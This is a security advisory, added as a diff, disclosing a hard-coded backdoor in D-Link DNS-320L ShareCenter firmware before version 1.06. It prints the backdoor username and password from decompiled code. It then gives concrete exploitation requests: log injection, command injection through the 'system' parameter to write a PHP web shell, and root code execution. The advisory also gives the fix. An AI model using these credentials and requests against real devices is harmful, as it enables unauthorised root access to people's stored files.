@@ -1,0 +1,214 @@
+DNS-320L ShareCenter Backdoor
+Vendor: D-Link
+Product: DNS-320L ShareCenter
+Version: < 1.06
+Website: http://www.dlink.com/uk/en/products/dns-320l-sharecenter-2-bay-cloud-storage-enclosure
+
+
+###########################################################################
+                     ______      ____________          __  
+                    / ____/_  __/ / __/_  __/__  _____/ /_ 
+                   / / __/ / / / / /_  / / / _ \/ ___/ __ \
+                  / /_/ / /_/ / / __/ / / /  __/ /__/ / / /         
+                  \____/\__,_/_/_/   /_/  \___/\___/_/ /_/ 
+                                                                
+                     GulfTech Research and Development                                                                                  
+
+###########################################################################
+#                  D-Link DNS-320L ShareCenter Backdoor                   #
+###########################################################################
+ 
+
+Released Date: 2018-01-03
+Last Modified: 2017-06-14
+ Company Info: D-Link
+ Version Info: 
+              Vulnerable
+               D-Link DNS-320L ShareCenter < 1.06
+               Possibly various other ShareCenter devices
+
+              Not Vulnerable
+               D-Link DNS-320L ShareCenter >= 1.06
+ 
+
+--[ Table of contents
+
+00 - Introduction
+    00.1 Background
+
+01 - Hard coded backdoor
+    01.1 - Vulnerable code analysis
+    01.2 - Remote exploitation
+
+02 - Credit
+
+03 - Proof of concept
+
+04 - Solution
+
+05 - Contact information
+
+
+--[ 00 - Introduction
+
+The purpose of this article is to detail the research that GulfTech has 
+recently completed regarding the D-Link DNS 320L ShareCenter.
+
+--[ 00.1 - Background
+
+D-Link Share Center 2-Bay Cloud Storage 2000 (DNS-320L) aims to be a 
+solution to share, stream, manage and back up all of your digital files by 
+creating your own personal Cloud. 
+
+
+--[ 01 - Hard coded backdoor
+
+While doing some research on another device, I came across a hard coded
+backdoor within one of the CGI binaries. Several different factors such as
+similar file structure and naming schemas led me to believe that the code
+that was in the other device was also shared with the DNS-320L ShareCenter.
+As it turned out our hunch was correct. An advisory regarding the other
+vulnerable device in question will be released in the future, as the vendor
+for that device is still in the process of addressing the issues.
+
+Now, let's take a moment to focus on the following file which is a standard 
+Linux ELF executable and pretty easy to go through. 
+
+/usr/local/modules/cgi/nas_sharing.cgi
+
+The above file can be accessed by visiting "/cgi-bin/nas_sharing.cgi" and
+contains the following function that is used to authenticate the user. 
+
+--[ 01.1 - Vulnerable code analysis
+
+Below is the psuedocode created from the disassembly of the binary. I have
+renamed the function to "re_BACKDOOR" to visually identify it more easily.
+
+struct passwd *__fastcall re_BACKDOOR(const char *a1, const char *a2)
+{
+  const char *v2; // r5@1
+  const char *v3; // r4@1
+  struct passwd *result; // r0@4
+  FILE *v5; // r6@5
+  struct passwd *v6; // r5@7
+  const char *v7; // r0@9
+  size_t v8; // r0@10
+  int v9; // [sp+0h] [bp-1090h]@1
+  char s; // [sp+1000h] [bp-90h]@1
+  char dest; // [sp+1040h] [bp-50h]@1
+
+  v2 = a2;
+  v3 = a1;
+  memset(&s, 0, 0x40u);
+  memset(&dest, 0, 0x40u);
+  memset(&v9, 0, 0x1000u);
+  if ( *v2 )
+  {
+    v8 = strlen(v2);
+    _b64_pton(v2, (u_char *)&v9, v8);
+    if ( dword_2C2E4 )
+    {
+      sub_1194C((const char *)&unk_1B1A4, v2);
+      sub_1194C("pwd decode[%s]\n", &v9);
+    }
+  }
+  if (!strcmp(v3, "mydlinkBRionyg") 
+  &&  !strcmp((const char *)&v9, "abc12345cba") )
+  {
+    result = (struct passwd *)1;
+  }
+  else
+  {
+    v5 = (FILE *)fopen64("/etc/shadow", "r");
+    while ( 1 )
+    {
+      result = fgetpwent(v5);
+      v6 = result;
+      if ( !result )
+        break;
+      if ( !strcmp(result->pw_name, v3) )
+      {
+        strcpy(&s, v6->pw_passwd);
+        fclose(v5);
+        strcpy(&dest, (const char *)&v9);
+        v7 = (const char *)sub_1603C(&dest, &s);
+        return (struct passwd *)(strcmp(v7, &s) == 0);
+      }
+    }
+  }
+  return result;
+}
+
+As you can see in the above code, the login functionality specifically
+looks for an admin user named "mydlinkBRionyg" and will accept the password
+of "abc12345cba" if found. This is a classic backdoor. Simply login with 
+the credentials that were just mentioned from the above code.
+
+--[ 01.2 - Remote exploitation
+
+Exploiting this backdoor is fairly trivial, but I wanted a root shell, not 
+just admin access with the possibility of shell access. So, I started 
+looking at the functionality of this file and noticed the method referenced 
+when the "cmd" parameter was set to "15". This particular method happened 
+to contain a command injection issue. Now I could turn this hard coded
+backdoor into a root shell, and gain control of the affected device.
+
+However, our command injection does not play well with spaces, or special 
+characters such as "$IFS", so I got around this by just playing ping pong
+with pipes, and syslog() in order to create a PHP shell. These are the 
+steps that I took to achieve this.
+
+STEP01: We send a logout request to /cgi-bin/login_mgr.cgi?cmd=logout with
+the "name" parameter value set to that of our malicious PHP wrapper code 
+within our POST data. This "name" parameter is never sanitized.
+
+name=
+
+At this point we have successfully injected our payload into the user logs, 
+as the name of the user who logouts is written straight to the user logs. A 
+user does not have to be logged in, in order to logout and inject data.
+
+STEP02: We now use cat to readin the user log file and pipe it out to the
+web directory in order to create our PHP web shell.
+
+GET /cgi-bin/nas_sharing.cgi?dbg=1&cmd=15&user=mydlinkBRionyg&passwd=YWJjMT
+IzNDVjYmE&system=cat/var/www/shell.php HTTP/1.1
+
+At this point an attacker can now simply visit the newly created web shell
+and execute any PHP code that they choose, as root.
+
+http://sharecenterhostname/shell.php?01100111=phpinfo();
+
+By sending a request like the one above a remote attacker would cause the
+phpinfo() function to be displayed, thus demonstrating successful remote 
+exploitation as root.
+
+
+--[ 02 - Credit
+
+James Bercegay
+GulfTech Research and Development
+
+
+--[ 03 - Proof of concept
+
+We strive to do our part to contribute to the security community.
+Metasploit modules for issues outlined in this paper can be found online.
+
+
+--[ 04 - Solution
+
+Upgrade to firmware version 1.06 or later. See the official vendor website
+for further details.
+
+
+--[ 05 - Contact information
+
+Web
+https://gulftech.org
+
+Mail
+security@gulftech.org
+
+
+Copyright 2018 GulfTech Research and Development. All rights reserved.
